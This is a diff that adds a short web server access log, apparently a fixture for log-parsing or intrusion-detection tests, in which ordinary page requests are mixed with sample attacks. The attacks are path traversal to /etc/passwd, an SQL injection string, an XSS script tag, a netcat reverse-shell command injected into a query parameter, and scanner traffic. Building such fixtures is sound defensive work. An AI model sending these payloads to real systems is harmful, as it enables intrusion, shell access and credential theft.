@@ -1,0 +1,8 @@
+192.168.1.100 - - [10/Oct/2023:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 2326 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+192.168.1.100 - - [10/Oct/2023:13:55:37 +0000] "GET /css/style.css HTTP/1.1" 200 1234 "http://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+203.0.113.42 - - [10/Oct/2023:13:55:38 +0000] "GET /admin/config.php?file=../../../etc/passwd HTTP/1.1" 404 234 "-" "curl/7.68.0"
+203.0.113.42 - - [10/Oct/2023:13:55:39 +0000] "POST /login HTTP/1.1' OR 1=1-- " 400 156 "-" "sqlmap/1.0"
+192.168.1.101 - - [10/Oct/2023:13:55:40 +0000] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 400 123 "-" "Mozilla/5.0"
+198.51.100.25 - - [10/Oct/2023:13:55:41 +0000] "GET /app?cmd=nc -e /bin/sh 192.168.1.1 4444 HTTP/1.1" 500 89 "-" "Burp Suite"
+192.168.1.102 - - [10/Oct/2023:13:55:42 +0000] "GET /images/logo.png HTTP/1.1" 200 5432 "http://example.com/" "Mozilla/5.0"
+93.184.216.34 - - [10/Oct/2023:13:55:43 +0000] "GET /wp-admin/ HTTP/1.1" 404 567 "-" "nikto/2.1.6"
